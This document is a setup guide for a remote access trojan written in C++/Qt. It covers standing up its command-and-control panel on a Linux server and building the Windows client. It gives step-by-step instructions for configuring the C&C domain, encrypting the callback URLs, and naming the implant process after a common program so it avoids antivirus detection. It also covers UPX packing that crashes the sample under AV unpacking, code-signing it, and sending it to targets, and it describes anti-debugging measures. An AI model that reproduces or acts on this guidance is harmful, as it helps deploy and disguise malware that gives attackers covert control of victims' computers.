# RAT
Rat coded in C++ and using QT
Educational Purposes Only
USAGE OF THIS PROGRAM's code, credit must be give

SETUP GUIDE
============


Server Side Instructions:
===========================
In order to setup the control panel, you will need a linux VPS with root access.
You only need to do this once.
I recommend ubuntu as it is easier to get and install packages required to build the control panel.

1. Download and extract the file you have onto the linux vps with the following commands:
bzip2 -d p2-export.tar.bz2
tar xvf p2-export.tar


2. You will now have a folder named "p" and all client-side code in different folders.
   First of all, please run the following command to remove client side codes:
rm -Rf d
rm -Rf o
rm -Rf py1


2.2. You now have to install qtcreator before compiling, under ubuntu please issue the following command as root:
apt-get install qtcreator


2.3. Now go to the p folder (cd p/) and edit your config file common.h, this file is quite stright forward as you can see:

This is where your domain goes:
#define P_HOSTNAME                                     "bitspeercachedetect.com"

These are required for SSL support:
#define P_PEM_CERT                            "bitspeercachedetect.com.cert.pem" // Your SSL certificate file
#define P_PEM_KEY                              "bitspeercachedetect.com.key.pem" // Your private SSL key file
#define P_PEM_CHAIN                                              "gd_bundle.crt" // Godaddy certificate bundles

You can get the last file from https://certs.godaddy.com/anonymous/repository.pki considering you SSL certificate is from Godaddy.
You don't need to use SSL but it is highly recommended for obvious reasons.

- Other configuration options are just for fine tuning but work perfectly fine the way they are, don't change them unless you've read the entire (yes, the entire) code !!

2.4 Compile the code using these 2 commands:
qmake
make
This will take a while as it is quite a lot of code.

2.5 Once done compiling you need to setup one last thing. cd to the htroot directory. (command: cd htroot)
- Create a folder with your domain name, for example: mkdir my.domain.com
- run the following command, replace my.domain.com with your C&C domain:
cp -R localhost/* my.domain.com/

- cd to the cgi-bin dir under your domain's folder, ie: cd my.domain.com/cgi-bin
- Now run the following commands:
touch clock
touch cmd
touch dir
touch drop
touch ip
touch list
touch noop
touch otp
touch otpgen
touch report
touch session

- go back to domain (cd ..) folder and run command mkdir static-files
- go inside folder static-files run this command:
ln -s  ../../../htbits/sessions/ gpe3c55teci1r975ihvfxkjexvzd3z4z

- Make sure no other webserver is running (like apache2 or nginx), if they are just stop them
/etc/init.d/nginx stop
/etc/init.d/apache2 stop
apache2ctl stop

- All done! Now go back to the main folder (p) and execute the webserver: ./p &
- You might want to setup a cron job that checks and runs the file if it is not running.

In order to login you must generate a One-Time-Password using the following link:
http://my.domain.com/cgi-bin/otpgen?cred={6jsi84qp-z1vi-xt14-nl6q-cdhbq3w7qrmt}
- Then take this password and use it @ login:
http://my.domain.com/cgi-bin/list

Notice that if you are not using SSL you will still be redirected to a SSL link (https://) - Just replace this with http:// and you should be good.







Client Side Setup:
===================

Requirements:
--------------
1. Visual Studio (2010 is recommended but others should work with no problems)
2. Stringprotect.exe (provided with this code)
3. UPX version 3.07 (!)


1. Extract the file p2-export.tar.bz2 to any location.

2. Go to the folder named "d" and open d.sln.
- You might be asked to convert the file depending on your version of visual studio. Do it if you are asked.

3. In visual studio, find the file named common.h and open it on your screen, this is the config file for the client side.

4. You will see 2 sets of config, 1 that doesnt use string protect and 1 that does. You only need to change the encrypted strings. Unencrypted is only for reference and debugging.

- Open the string encryption tool (stringprotect.exe) provided to you by me in the archive.
- First, we want to change the URLs of the C&C:
- In the tool write the following, be sure that my.domain.com is the actual domain you are using:
S("http://my.domain.com/")
if you want SSL support use https:
S("https://my.domain.com/")
* !! YOU MUST HAVE A REAL AND VALID SSL CERTIFICATE FOR THIS DOMAIN IF YOU WANT TO USE SSL !! *

This will results in an encrypted strings in the second box, copy that strings [without the "S(" and ")" just the \x5c... part] into the right place of common.h so it looks like this:

#define URL_HOST L"\x5c\x5b\x45\x48\x72\x6c\x7e\x76\x56\x46\x45\x4b\x71\x33\x34\x2b\x57\x4e\x52\x50\x64\x32\x34\x2d\x51\x4c\x45\x16\x62\x39\x3c\x76\x34"

- now change other encrypted strings (ALL OF THEM), for example where #define REQUEST_NOOP is located you must encrypt string like:
http://my.domain.com/cgi-bin/noop?id=
so in stringprotect.exe you write:
S("http://my.domain.com/cgi-bin/noop?id=")
and copy encrypted string to the right location at common.h so it looks like:

#define REQUEST_NOOP L"\x5c\x5b ..."

- MAIN_FILENAME is the name of the file that will be created and run, reader_sl.exe is great since it does not trigger AV and is used everywhere. This is the name of the new process after running the exe on target. If you use svchost etc it might trigger AV so be careful.


--- *ONLY IF* you are *NOT* using code signing, you must change the following in main.cpp: 
    ===========================================
  switch (trustissueres) {
  case TRUST_E_PROVIDER_UNKNOWN:
    OSVERSIONINFO vi;
    ZeroMemory(&vi, sizeof(OSVERSIONINFO));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (GetVersionEx(&vi) && vi.dwMajorVersion == 5 && vi.dwMinorVersion == 2
      && trustissueres == TRUST_E_PROVIDER_UNKNOWN) {
      return;
    }
  case TRUST_E_NOSIGNATURE:
  case TRUST_E_SUBJECT_FORM_UNKNOWN:
    exit(1);
    break;
  case 0:
    break;
  default:
    exit(1);
  }

comment all this out using /* and */.

######################################################################################
# *** Make sure to set visual studio to building in Release mode and not Debug ! *** #
######################################################################################

Now just build the project, and you will have a file named d.exe in the Release folder of the project.

IMPORTANT:
YOU MUST USE upx VERSION 3.07, or else the file will fail to decrypt itself and the strings when running!
- using upx in a cmd.exe window do this for example:
C:\upx307w> upx.exe -9 d.exe

- Now your file is ready to be digitally signed with signtool and sent to your clients :)
https://www.google.com/search?q=signtool
I recommend using like this from cmd.exe:
signtool /signwizard

Don't forget to use time-stamp url so the signature will be valid forever.


Good Luck!









Extra info:
-----------
This is a very big and complex code. Not the every-day script kiddie quality.
If you are making changes to it there are some things you should be aware of:

String encryption is quite a simple encryption code found in main.cpp.

The encryption key is part of the binary file (after compiled). It is the string of the UPX version.
"3.07(0x00)UPX"
This is why you must use upx 3.07 to pack the file.
This also insures that if AV unpacks the file from UPX to analyze - it cannot run correctly and will crash.

Wintrust is also used to ensure that the file has been signed.
If the fils is not signed (and if you didn't change the source code) - The file will not run.
This way tampering and static analysis is quite impossible. Unless you want to analyze a upx packed file :-)
Other anti-debgging techs are implanted into the code and you can find them mostly in main.cpp



upx 3.0.7
windows sdk
pscp
visual studio 2010
putty.exe

VPS Ubuntu 14.04 LTS (32bit)
